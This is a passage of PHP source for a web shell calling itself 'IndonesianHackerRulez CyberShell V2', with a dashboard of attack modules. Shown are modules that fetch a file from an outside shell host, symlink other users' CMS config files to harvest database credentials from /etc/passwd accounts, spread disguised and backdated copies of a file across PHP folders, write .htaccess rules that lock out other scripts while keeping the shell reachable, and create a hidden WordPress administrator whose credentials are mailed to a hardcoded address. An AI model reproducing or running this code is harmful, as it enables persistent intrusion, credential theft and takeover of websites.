    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form></td></table><br>";
    if(isset($_POST['gass'])) {
        if (empty($_POST['miner'])) echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle'></i> Input field is required<center></font></td></table>";
        else {
            $check = $serlok."/".$_POST['miner'];
            $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web."",$check);
            $content = crot('https://shell.prinsh.com/Nathan/adminer.txt');
            $open = fopen($check, 'w');
            fwrite($open, $content);
            fclose($open);
            if (file_exists($check)) echo "<table class='directory-listing-table' style='border-color:lime;'><td>Adminer<font color='lime'> : $check </font><br>Link : <a href='".$result."' target='_blank'><i>$result</i></a></td></table>";
            else echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle'></i> Failed to create adminer..!!</center></font></td></table>";
        }
    }
    exit();
}

// ---- SYMLINK SCANNER ----
if ($_GET[net('symlink_scanner')] == "opet") {
    $created = 0;
    $users = [];
    if (file_exists('/etc/passwd')) {
        $lines = file('/etc/passwd');
        foreach ($lines as $line) {
            $parts = explode(':', $line);
            if (isset($parts[0]) && strlen($parts[0]) > 2) $users[] = $parts[0];
        }
    }
    $users = array_unique(array_merge($users, ['admin','root','www-data','nobody','user','cpanel']));
    $baseDirs = ['', 'public_html/', 'public_html/blog/', 'public_html/wordpress/', 'public_html/wp/',
                 'public_html/html/', 'public_html/web/', 'public_html/forum/', 'public_html/forums/',
                 'public_html/smf/', 'public_html/vb/', 'public_html/vb3/', 'public_html/cc/',
                 'public_html/inc/', 'public_html/includes/', 'public_html/include/',
                 'public_html/config/', 'public_html/conf/', 'public_html/admin/',
                 'public_html/clients/', 'public_html/client/', 'public_html/billing/',
                 'public_html/whmcs/', 'public_html/whm/', 'public_html/whmc/',
                 'public_html/order/', 'public_html/support/', 'public_html/supports/',
                 'public_html/cpanel/', 'public_html/panel/', 'public_html/host/',
                 'public_html/hosting/', 'public_html/hosts/', 'public_html/v1/',
                 'public_html/v2/', 'public_html/baru/', 'public_html/beta/',
                 'public_html/joomla/', 'public_html/joom/', 'public_html/joo/',
                 'public_html/cms/', 'public_html/site/', 'public_html/main/',
                 'public_html/news/', 'public_html/new/', 'public_html/home/',
                 'public_html/test/', 'public_html/myshop/', 'public_html/store/',
                 'public_html/shop/', 'public_html/shopping/', 'public_html/sale/',
                 'public_html/oscommerce/', 'public_html/oscommerces/',
                 'public_html/zencart/', 'public_html/amember/',
                 'public_html/portal/', 'public_html/press/',
                 'public_html/upload/', 'public_html/Connections/',
                 'public_html/system/', 'public_html/application/config/',
                 'public_html/app/etc/', 'public_html/.my.cnf', 'public_html/.accesshash'];
    $fileMap = [
        'configuration.php' => 'Joomla',
        'wp-config.php' => 'WordPress',
        'Settings.php' => 'SMF',
        'config.php' => 'Config',
        'settings.php' => 'Drupal',
        'database.php' => 'CodeIgniter',
        'configure.php' => 'Oscommerce',
        'dist-configure.php' => 'ZenCart',
        'local.xml' => 'Magento',
        'config.inc.php' => 'Amember',
        'connect.php' => 'Connect',
        'koneksi.php' => 'Lokomedia',
        'conf_global.php' => 'Invision',
        'sistem.php' => 'Lokomedia',
        'mk_conf.php' => 'mk-portale',
        'functions.php' => 'phpBB',
        'db.php' => 'Infinity',
        'SSI.php' => 'CMF',
        'cms_blog.php' => 'CMS Blog',
        'submitticket.php' => 'WHMCS Ticket'
    ];
    echo "<table class='directory-listing-table'><td><h5>Symlink Scanner</h5><hr>";
    foreach ($users as $user) {
        foreach ($baseDirs as $dir) {
            foreach ($fileMap as $file => $label) {
                for ($i = 0; $i <= 7; $i++) {
                    $home = ($i==0) ? '/home/' : '/home' . $i . '/';
                    $source = $home . $user . '/' . rtrim($dir, '/') . '/' . $file;
                    $linkname = $user . ' ~~ ' . $label . ' (' . basename($dir) . ').txt';
                    if (file_exists($source) && is_file($source) && !file_exists($linkname)) {
                        if (@symlink($source, $linkname)) $created++;
                    }
                }
            }
        }
    }
    $specifics = [
        '/var/www/html/wp-config.php' => 'WORDPRESS.txt',
        '/var/www/html/configuration.php' => 'JOOMLA.txt',
        '/var/www/html/config.inc.php' => 'OPENJOURNAL.txt',
        '/var/www/html/config.php' => 'OTHER.txt',
        '/var/www/html/connect.php' => 'OTHER.txt',
        '/var/www/wp-config.php' => 'WORDPRESS.txt',
        '/var/www/configuration.php' => 'JOOMLA.txt',
        '/var/www/config.php' => 'OTHER.txt',
    ];
    foreach ($specifics as $src => $label) {
        if (file_exists($src) && is_file($src) && !file_exists($label)) {
            if (@symlink($src, $label)) $created++;
        }
    }
    echo "Created <font color='lime'>$created</font> symlinks.<br>";
    echo "<a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light'>Back</a></td></table>";
    exit();
}

// ---- USER JUMP - TAMBAHAN PATH /var/wwwroot/ dan /www/wwwroot/ ----
if ($_GET[net('user_jump')] == "opet") {
    $passwd = '';
    if (file_exists('/etc/passwd')) $passwd = @file_get_contents('/etc/passwd');
    if (empty($passwd)) $passwd = @shell_exec('cat /etc/passwd 2>/dev/null');
    
    echo "<table class='directory-listing-table'><td>
    <h5 style='color:#40BECC;'><i class='fa fa-users'></i> User Jump</h5>
    <hr style='border-color:#40BECC;'>
    <div style='padding:10px;'>";
    
    if (!empty($passwd)) {
        preg_match_all('/^([^:]+):.*:\/home\/([^:]+):/m', $passwd, $matches);
        if (empty($matches[1])) preg_match_all('/^([^:]+):.*:\/bin\/(bash|sh)/m', $passwd, $matches);
        $users = array_unique(array_merge($matches[1], $matches[2] ?? []));
        
        echo "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;'>
        <span style='color:#94a3b8;'>Total user: <strong style='color:#40BECC;'>" . count($users) . "</strong></span>
        <span style='color:#94a3b8;font-size:12px;'><i class='fa fa-folder-open'></i> Path tersedia</span>
        </div>";
        
        echo "<div style='max-height:500px;overflow-y:auto;border:1px solid #334155;border-radius:8px;'>";
        echo "<table class='table table-dark table-hover' style='margin:0;'>";
        echo "<thead style='position:sticky;top:0;z-index:10;background:#0f172a;'>
        <tr>
        <th style='width:15%;color:#40BECC;'>User</th>
        <th style='width:45%;color:#40BECC;'>Path</th>
        <th style='width:20%;color:#40BECC;'>Status</th>
        <th style='width:20%;color:#40BECC;'>Domain</th>
        </tr>
        </thead>";
        echo "<tbody>";
        
        foreach ($users as $user) {
            $paths = [];
            // Path utama
            $paths[] = '/home/' . $user . '/public_html';
            // Tambahan path dari request
            $extra_paths = [
                '/var/wwwroot/',
                '/www/wwwroot/',
                '/www/wwwroot/' . $user . '/',
                '/var/www/html/' . $user . '/',
                '/home/' . $user . '/domains/',
                '/home/' . $user . '/domains/' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/public_html/',
                '/var/www/vhosts/' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/httpdocs/',
                '/var/www/vhosts/' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/public_html/',
            ];
            
            foreach ($extra_paths as $p) {
                if (is_dir($p) && !in_array($p, $paths)) $paths[] = $p;
            }
            
            // Cari domain untuk user ini
            $domains = [];
            if (is_dir('/etc/valiases/')) {
                $domain_files = scandir('/etc/valiases/');
                if ($domain_files) {
                    foreach ($domain_files as $df) {
                        if ($df === '.' || $df === '..') continue;
                        $content = @file_get_contents('/etc/valiases/' . $df);
                        if ($content && strpos($content, $user . '@') !== false) {
                            $domains[] = $df;
                        }
                    }
                }
            }
            if (empty($domains)) {
                $domains[] = '-';
            }
            
            $found = false;
            foreach ($paths as $pub) {
                if (is_dir($pub)) {
                    $isReadable = is_readable($pub);
                    $status = $isReadable ? '<span style="color:#4ade80;"><i class="fa fa-check-circle"></i> Readable</span>' : '<span style="color:#f87171;"><i class="fa fa-times-circle"></i> Not readable</span>';
                    $link = $isReadable ? '<a href="?path=' . urlencode($pub) . '" style="color:#40BECC;text-decoration:none;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' . h($pub) . '</a>' : '<span style="color:#64748b;">' . h($pub) . '</span>';
                    $domain_link = !empty($domains) && $domains[0] !== '-' ? '<a href="http://' . h($domains[0]) . '" target="_blank" style="color:#40BECC;text-decoration:none;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'"><i class="fa fa-globe"></i> ' . h($domains[0]) . '</a>' : '-';
                    
                    echo "<tr style='border-bottom:1px solid #1e293b;'>";
                    echo "<td><strong style='color:#fbbf24;'>" . h($user) . "</strong></td>";
                    echo "<td>" . $link . "</td>";
                    echo "<td>" . $status . "</td>";
                    echo "<td>" . $domain_link . "</td>";
                    echo "</tr>";
                    $found = true;
                    break;
                }
            }
            
            if (!$found) {
                // Tampilkan user tanpa path yang ditemukan
                echo "<tr style='border-bottom:1px solid #1e293b;opacity:0.6;'>";
                echo "<td><strong style='color:#fbbf24;'>" . h($user) . "</strong></td>";
                echo "<td><span style='color:#64748b;'><i class='fa fa-folder-o'></i> No public_html</span></td>";
                echo "<td><span style='color:#f87171;'><i class='fa fa-times-circle'></i> Not found</span></td>";
                echo "<td>-</td>";
                echo "</tr>";
            }
        }
        
        echo "</tbody></table></div>";
        
        // Statistik
        echo "<div style='margin-top:15px;display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:#94a3b8;'>";
        echo "<span><i class='fa fa-check-circle' style='color:#4ade80;'></i> Readable: <span style='color:#4ade80;'>" . count(array_filter($users, function($u) { return is_dir('/home/' . $u . '/public_html') && is_readable('/home/' . $u . '/public_html'); })) . "</span></span>";
        echo "<span><i class='fa fa-times-circle' style='color:#f87171;'></i> Not found: <span style='color:#f87171;'>" . count(array_filter($users, function($u) { return !is_dir('/home/' . $u . '/public_html'); })) . "</span></span>";
        echo "<span><i class='fa fa-folder' style='color:#40BECC;'></i> Total user: <span style='color:#40BECC;'>" . count($users) . "</span></span>";
        echo "</div>";
        
    } else {
        echo "<div style='color:#f87171;padding:20px;text-align:center;'><i class='fa fa-exclamation-triangle'></i> Gagal membaca /etc/passwd</div>";
    }
    
    echo "<br><a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='border-color:#40BECC;'><i class='fa fa-arrow-left'></i> Back</a>";
    echo "</div></td></table>";
    exit();
}

// ---- MASS CHMOD ----
if ($_GET[net('masschmod')] == "opet") {
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-gears'></i> Mass Chmod</h5><hr>
    <form method='POST'>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Directory :</span>
    <input type='text' name='dir_path' class='form-control mb-2' value='$serlok'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Folder Perm :</span>
    <input type='text' name='folder_perm' class='form-control mb-2' value='0755'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>File Perm :</span>
    <input type='text' name='file_perm' class='form-control mb-2' value='0644'></div>
    <button type='submit' name='masschmod_submit' class='btn btn-outline-light' style='width:120px;'>Apply</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table>";
    if(isset($_POST['masschmod_submit'])) {
        $dir = $_POST['dir_path'];
        $folder_perm = octdec($_POST['folder_perm']);
        $file_perm = octdec($_POST['file_perm']);
        $count = 0;
        if(is_dir($dir)) {
            $rdi = new RecursiveDirectoryIterator($dir);
            foreach (new RecursiveIteratorIterator($rdi) as $file) {
                if($file->isDir()) {
                    @chmod($file->getPathname(), $folder_perm);
                } else {
                    @chmod($file->getPathname(), $file_perm);
                }
                $count++;
            }
            echo "<table class='directory-listing-table' style='border-color:lime;'><td>Mass Chmod applied to <font color='lime'>$count</font> items</td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'>Directory not found</font></td></table>";
        }
    }
    exit();
}

// ---- MASS SPREAD V2 - ACAK DAN SAMARAN ----
if ($_GET[net('massspread')] == "opet") {
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-copy'></i> Mass Spread V2 - Acak & Samaran</h5><hr>
    <form method='POST'>
    <div class='input-group' style='width:450px;'><span class='input-group-text mb-2'>File Sumber :</span>
    <input type='text' name='file_sumber' class='form-control' placeholder='gumakn costum'></div>
    <div class='input-group' style='width:450px;'><span class='input-group-text mb-2'>Directory Target :</span>
    <input type='text' name='dir_target' class='form-control' value='$serlok'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Maksimal Folder :</span>
    <input type='number' name='maksimal_folder' class='form-control' value='10'></div>
    <button type='submit' name='spread_submit' class='btn btn-outline-light' style='width:120px;'>Spread</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table>";

    if(isset($_POST['spread_submit'])) {
        $file_sumber = $_POST['file_sumber'];
        $dir_target = $_POST['dir_target'];
        $maksimal_folder = isset($_POST['maksimal_folder']) ? (int)$_POST['maksimal_folder'] : 10;
        
        echo "<table class='directory-listing-table'><td><pre>";

        if (!file_exists($file_sumber)) {
            echo "[!] Error: File sumber '$file_sumber' tidak ditemukan.\n";
        } elseif (!is_dir($dir_target)) {
            echo "[!] Error: Directory target '$dir_target' tidak ditemukan.\n";
        } else {
            $web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
            $doc_root = $_SERVER['DOCUMENT_ROOT'];
            
            echo "[*] Memulai pengumpulan folder...\n";
            echo "[*] File sumber: $file_sumber\n";
            echo "[*] Target: $dir_target\n";

            try {
                $directory = new RecursiveDirectoryIterator($dir_target, RecursiveDirectoryIterator::SKIP_DOTS);
                $iterator = new RecursiveIteratorIterator(
                    $directory,
                    RecursiveIteratorIterator::SELF_FIRST,
                    RecursiveIteratorIterator::CATCH_GET_CHILD
                );

                $kandidat_folder = [];

                foreach ($iterator as $item) {
                    if ($item->isFile() && strtolower($item->getExtension()) === 'php') {
                        $path_folder = $item->getPath();
                        if (!isset($kandidat_folder[$path_folder])) {
                            $kandidat_folder[$path_folder] = [
                                'nama_file_asli' => pathinfo($item->getFilename(), PATHINFO_FILENAME),
                                'ekstensi_asli' => $item->getExtension(),
                                'real_path_file' => $item->getRealPath()
                            ];
                        }
                    }
                }

                $daftar_folder_keys = array_keys($kandidat_folder);
                shuffle($daftar_folder_keys);

                echo "[*] Total ditemukan " . count($daftar_folder_keys) . " folder berisi file PHP.\n";
                echo "[*] Memulai penebaran acak ke maksimal $maksimal_folder folder berbeda...\n";
                echo "--------------------------------------------------\n";

                $jumlah_tercopy = 0;
                $jumlah_dilewati = 0;
                $url_list = [];

                foreach ($daftar_folder_keys as $path_folder) {
                    if ($jumlah_tercopy >= $maksimal_folder) break;

                    $info_file = $kandidat_folder[$path_folder];
                    $nama_samaran_tanpa_ekstensi = buatNamaSamaran($info_file['nama_file_asli']);
                    $nama_file_samaran = $nama_samaran_tanpa_ekstensi . '.' . $info_file['ekstensi_asli'];
                    
                    $tujuan = $path_folder . DIRECTORY_SEPARATOR . $nama_file_samaran;
                    $real_tujuan = realpath($path_folder) ? realpath($path_folder) . DIRECTORY_SEPARATOR . $nama_file_samaran : $tujuan;

                    if (file_exists($tujuan)) {
                        echo "[~] Dilewati (File tiruan sudah ada): $real_tujuan\n";
                        $jumlah_dilewati++;
                    } else {
                        if (copy($file_sumber, $tujuan)) {
                            $waktu_original = filemtime($info_file['real_path_file']);
                            touch($tujuan, $waktu_original);
                            
                            $date_formatted = date("Y-m-d H:i:s", $waktu_original);
                            
                            // Generate URL
                            $url_path = str_replace($doc_root, '', $real_tujuan);
                            $full_url = rtrim($web, '/') . '/' . ltrim($url_path, '/');
                            $url_list[] = $full_url;
                            
                            echo "[+] BERHASIL ACAK & SAMAR : $real_tujuan\n";
                            echo "    -> Meniru pola file    : " . $info_file['nama_file_asli'] . '.' . $info_file['ekstensi_asli'] . " (Date: $date_formatted)\n";
                            echo "    -> URL : <a href='$full_url' target='_blank'>$full_url</a>\n";
                            
                            $jumlah_tercopy++;
                        } else {
                            echo "[-] Gagal menyalin ke       : $real_tujuan\n";
                        }
                    }
                }

                echo "--------------------------------------------------\n";
                echo "[✓] Selesai!\n";
                echo "    - Berhasil disebar secara acak : $jumlah_tercopy folder berbeda.\n";
                echo "    - Dilewati                     : $jumlah_dilewati\n";
                
                if (!empty($url_list)) {
                    echo "\n--- URL List ---\n";
                    foreach ($url_list as $url) {
                        echo "  <a href='$url' target='_blank'>$url</a>\n";
                    }
                }

            } catch (Exception $e) {
                echo "[!] Terjadi kesalahan: " . $e->getMessage() . "\n";
            }
        }
        
        echo "</pre></td></table>";
    }
    exit();
}

// ---- HTACCESS GENERATOR ----
if ($_GET[net('htaccess')] == "opet") {
    $currentFile = basename($_SERVER['SCRIPT_FILENAME']);
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-lock'></i> HTAccess Generator</h5><hr>
    <form method='POST'>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Location :</span>
    <select name='htaccess_location' class='form-control'>
    <option value='document_root'>Document Root</option>
    <option value='current'>Current Directory</option>
    <option value='all'>All Folders</option>
    </select></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Mode :</span>
    <select name='htaccess_mode' class='form-control'>
    <option value='deny'>Deny (Block dangerous)</option>
    <option value='allow'>Allow (Only allowed)</option>
    </select></div>
    <div class='input-group' style='width:450px;'><span class='input-group-text mb-2'>Allowed Files :</span>
    <textarea name='htaccess_allowed' class='form-control' rows='3'>".$currentFile."\nindex.php\nwp-config.php\nwp-includes.php</textarea></div>
    <div class='form-check'><input type='checkbox' name='htaccess_chmod' checked> Auto chmod 444</div><br>
    <button type='submit' name='htaccess_submit' class='btn btn-outline-light' style='width:120px;'>Apply</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table>";
    if(isset($_POST['htaccess_submit'])) {
        $location = $_POST['htaccess_location'];
        $mode = $_POST['htaccess_mode'];
        $allowed_files = $_POST['htaccess_allowed'];
        $chmod = isset($_POST['htaccess_chmod']);
        $currentFile = basename($_SERVER['SCRIPT_FILENAME']);
        $allowed_list = array_filter(array_map('trim', explode("\n", str_replace(',', "\n", $allowed_files))));
        $must_allow = array($currentFile, 'index.php', 'wp-config.php', 'wp-includes.php');
        foreach ($must_allow as $f) if (!in_array($f, $allowed_list)) $allowed_list[] = $f;
        $allowed_list = array_unique($allowed_list);
        $htaccess = "# IndonesianHackerRulez CyberShell HTAccess\n# Generated on " . date('Y-m-d H:i:s') . "\n# Current script: $currentFile (always allowed)\n\n";
        $block_ext = array('php','ph*','Ph*','PH*','pH*','shtml','shtm*','ShTm*','SHTM*','sHTm*','sh*','cgi','suspected','p*','pl','py','pyc','pyo','php3','php4','php5','php6','php7','php8','php9','phtml','inc','phar','phtMl','phtmL','PHtml','PhTml','PHTML','PHTml','PHTMl','PhtMl','PHTml','PHtML','pHTMl','PhTML','pHTML','PhtmL','PHTmL','PhtMl','PhtmL','pHtMl','PhTmL','pHtmL','aspx','asp','php.jpg','php.jpeg','php.fla','php.png','php.gif','php.test','php;.jpg','php.bak','php.pdf','php.xxxpdf','php.xxxpng','fla','php.xxxgif','shtml','php.doc','php.docx','php.pdf','php.ppdf','jpg.PhP','php.txt','php.xlsx','php.zip','php.xxxzip','php78','php56','php96','php69','php67','php68','php4','shtMl','shtmL','SHtml','ShTml','SHTML','SHTml','SHTMl','ShtMl','SHTml','SHtML','sHTMl','ShTML','sHTML','ShtmL','SHTmL','ShtMl','ShtmL','sHtMl','ShTmL','sHtmL','Shtml','sHtml','shTml','sHTml','shtml','php1','php2','php3','php4','php10','alfa','suspected','py','exe','htm','html','htaccess');
        if ($mode === 'deny') {
            $htaccess .= "<FilesMatch \"\\.(" . implode('|', $block_ext) . ")$\">\n    Deny from all\n</FilesMatch>\n\n";
            $htaccess .= "<FilesMatch \"^(" . implode('|', $allowed_list) . ")$\">\n    Allow from all\n</FilesMatch>\n\n";
            $htaccess .= "<FilesMatch \"\\.(jpg|png|gif|pdf|jpeg|css|js|ico|svg|webp)$\">\n    Allow from all\n</FilesMatch>\n";
        } else {
            $htaccess .= "Order Deny,Allow\nDeny from all\n\n";
            $htaccess .= "<FilesMatch \"^(" . implode('|', $allowed_list) . ")$\">\n    Allow from all\n</FilesMatch>\n\n";
            $htaccess .= "<FilesMatch \"\\.(jpg|png|gif|pdf|jpeg|css|js|ico|svg|webp)$\">\n    Allow from all\n</FilesMatch>\n";
        }
        $success = 0;
        if ($location === 'document_root') {
            $target = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
            if (file_put_contents($target, $htaccess) !== false) { $success++; if ($chmod) @chmod($target, 0444); }
        } elseif ($location === 'current') {
            $target = $serlok . '/.htaccess';
            if (file_put_contents($target, $htaccess) !== false) { $success++; if ($chmod) @chmod($target, 0444); }
        } else {
            $dirs = [$serlok];
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($serlok, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($iter as $item) if ($item->isDir()) $dirs[] = $item->getPathname();
            $dirs = array_unique($dirs);
            foreach ($dirs as $dir) {
                $target = rtrim($dir, '/') . '/.htaccess';
                if (file_put_contents($target, $htaccess) !== false) { $success++; if ($chmod) @chmod($target, 0444); }
            }
        }
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>HTAccess applied to <font color='lime'>$success</font> location(s)</td></table>";
    }
    exit();
}

// ---- WORDPRESS ADMIN CREATE ----
if ($_GET[net('wpcreate')] == "opet") {
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-wordpress'></i> WordPress Admin Creator</h5><hr>
    <form method='POST'>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>WP Path :</span>
    <input type='text' name='wp_path' class='form-control mb-2' value='$serlok'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Username :</span>
    <input type='text' name='wp_username' class='form-control mb-2' placeholder='admin_auto'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Password :</span>
    <input type='text' name='wp_password' class='form-control mb-2' placeholder='auto-generate'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Email :</span>
    <input type='email' name='wp_email' class='form-control mb-2' value='hackerman3117@gmail.com'></div>
    <button type='submit' name='wp_create' class='btn btn-outline-light' style='width:120px;'>Create Admin</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table>";
    if(isset($_POST['wp_create'])) {
        $wpLoad = findWpLoad($_POST['wp_path']);
        if ($wpLoad) {
            define('WP_USE_THEMES', false);
            require_once($wpLoad);
            if (function_exists('wp_insert_user')) {
                $email = $_POST['wp_email'];
                if (function_exists('email_exists') && email_exists($email)) {
                    echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'>Email $email already exists.</font></td></table>";
                } else {
                    $username = !empty($_POST['wp_username']) ? $_POST['wp_username'] : 'admin_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
                    $password = !empty($_POST['wp_password']) ? $_POST['wp_password'] : (function_exists('wp_generate_password') ? wp_generate_password(16, true) : substr(md5(uniqid(mt_rand(), true)), 0, 12));
                    $user_id = function_exists('wp_create_user') ? wp_create_user($username, $password, $email) : false;
                    if (!is_wp_error($user_id) && $user_id) {
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                        echo "<table class='directory-listing-table' style='border-color:lime;'><td>✅ WordPress admin created!<br>
                        Username: <font color='lime'>$username</font><br>
                        Password: <font color='lime'>$password</font><br>
                        Email: <font color='lime'>$email</font><br>
                        Login URL: " . (function_exists('home_url') ? home_url('/wp-admin') : '/wp-admin') . "</td></table>";
                        if (function_exists('wp_mail')) @wp_mail($email, 'Your WordPress Admin Account', "Username: $username\nPassword: $password");
                    } else {
                        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'>Failed to create user: " . (is_wp_error($user_id) ? $user_id->get_error_message() : 'Unknown error') . "</font></td></table>";
                    }
                }
            } else {
                echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'>WordPress functions not aIndonesianHackerRulezlable.</font></td></table>";
            }
        } else {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'>wp-load.php not found in: " . $_POST['wp_path'] . "</font></td></table>";
        }
    }
    exit();
}

// ============================================================
// FILE LISTING
// ============================================================
if (!is_readable($serlok)) {
    die("<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :(</font></center></td></thead></table>");
}

echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 20px black;width:90%;border-left:1px solid #40BECC;border-right:1px solid #40BECC;border-bottom:1px solid #40BECC;" align="center">
<thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;"><tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Last Modified</center></th>
<th><center>Owner</center></th>
<th><center>Permissions</center></th>
<th><center>Actions</center></th>
</tr></thead><center>';

$fetch = scandir($serlok);
$folders = []; $files = [];
foreach($fetch as $fols){
    if($fols=='.'||$fols=='..') continue;
    $path = $serlok.'/'.$fols;
    if(is_dir($path)) $folders[] = $fols;
    elseif(is_file($path)) $files[] = $fols;
}

foreach($folders as $dir){
    $path = $serlok."/".$dir;
    echo "<tr><td><i class='fa fa-folder' style='color:#FAA625'></i> <a href='?path=$path'>$dir</a></td>
    <td><center>Dir</center></td>
    <td><center>".filedate($path)."</center></td>
    <td>".owner($path)."</td>
    <td><center>".cekwrite($path)."</center></td>
    <td><center><form method='POST' action='?pilihan&path=$serlok'>
    <div class='btn-group me-2' role='group'>
    <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'><i class='fa fa-pencil' style='color:#fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color:#06D2D5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color:#5654F5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color:#E53A3A'></i></button>
    </div>
    <input type='hidden' name='type' value='dir'>
    <input type='hidden' name='path' value='$path'>
    </form></center></td></tr>";
}

foreach($files as $file){
    $path = $serlok."/".$file;
    $size = filesize($path)/1024;
    $size = round($size,3);
    if($size >= 1024) $size = '<font color="aqua">'.round($size/1024,2).'</font> MB';
    else $size = '<font color="#E6F01C">'.$size.'</font> KB';
    echo "<tr><td><i class='fa fa-file-code-o' style='color:#456DEB;'></i> <a href='?viewfile=$path&path=$serlok'>$file</a></td>
    <td><center>".$size."</center></td>
    <td><center>".filedate($path)."</center></td>
    <td>".owner($path)."</td>
    <td><center>".cekwrite($path)."</center></td>
    <td><center><form method='POST' action='?pilihan&path=$serlok'>
    <div class='btn-group' role='group'>
    <button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'><i class='fa fa-edit' style='color:#7AFF41'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'><i class='fa fa-pencil' style='color:#fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmod'><i class='fa fa-gear' style='color:#06D2D5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdate'><i class='fa fa-calendar' style='color:#5654F5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color:#E53A3A'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'><i class='fa fa-file-archive-o' style='color:#F1BE0F'></i></button>
    </div>
    <input type='hidden' name='type' value='file'>
    <input type='hidden' name='path' value='$path'>
    </form></center></td></tr>";
}

echo '</tr></td></table>';

// ============================================================
// FOOTER
// ============================================================
echo '<br><table class="directory-listing-table"><td><center><font face="Carrois Gothic" size="3px">IndonesianHackerRulez CyberShell &copy; 2024 -  V2</center></td></table><br>';
?>
</body>
</html>
